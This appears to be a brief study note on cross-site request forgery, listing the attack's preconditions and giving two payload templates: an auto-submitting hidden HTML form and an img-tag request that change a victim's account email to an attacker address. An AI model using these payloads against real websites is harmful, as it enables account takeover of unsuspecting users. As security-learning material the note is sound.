# CSRF

Allows an attacker to partly circumvent the same origin policy

## Conditions:
- Action
- Cookie-based session
- No unpredictable parameters

~~~~
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>

CSRF can be not just with cookies but also with Basic Auth or certificate authentication.
~~~~

## Deliver CSRF exploit

`<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">`
